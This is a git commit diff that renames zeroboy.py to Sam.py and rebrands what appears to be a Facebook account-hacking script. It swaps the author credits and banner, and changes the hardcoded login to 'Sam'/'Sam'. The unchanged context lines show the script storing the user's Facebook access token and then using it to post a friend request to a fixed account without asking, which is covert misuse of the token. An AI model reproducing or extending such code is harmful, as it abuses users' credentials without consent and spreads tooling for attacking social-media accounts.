60df56caebe8b4ff2be66acef1ccde7d827b1470
samkhanteevno7862 <65410664+samkhanteevno7862@users.noreply.github.com>
2020-05-16 08:08:41 +0500

    Update and rename zeroboy.py to Sam.py

--- Sam.py
+++ Sam.py
@@ -49,17 +49,17 @@ def jalan(z):
 ##### LOGO #####
 logo = """ -----------------------------•◈•
 (  __)\\ ____--------------_------------•◈•
-|__(~)    •||•THE - AAHIL -OFFICAL------•◈•
-|__\~~) •||•RANA - RAJPUT---------------•◈•
-|__(-----\  •◈•------BLACK-TIGER--------•◈•
+|__(~)    •||•THE - SAM -OFFICAL------•◈•
+|__\~~) •||•Khan - KING---------------•◈•
+|__(-----\  •◈•------KING-TIGER--------•◈•
 |__~~~\ •◈•-----█-------⑦-------█------•◈•
 |__~~~\ •◈•-----█-------⑧-------█------•◈•
 |__~~~\ •◈•-----█-------⑥-------█------•◈•
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;FlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1; Aahilrna4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Therana/zero
+\033[1;96mAuthor  \033[1;93m: \033[1;92Sam Khan
+\033[1;96mInstagram \033[1;93m: \033[1;FlowSam
+\033[1;96mFacebook  \033[1;93m: \033[1; Samkhan4072
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/TheSam/Khan
 \033[1;91m======================================="""
 
 def tik():
@@ -87,8 +87,8 @@ print  """\033[1;91m=======================================
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "Sam"
+CorrectPassword = "Sam"
 
 loop = 'true'
 while (loop == 'true'):
@@ -144,7 +144,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				os.system('xdg-open https://www.Facebook.com/knock.knock.tera.bap.aya.ha')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
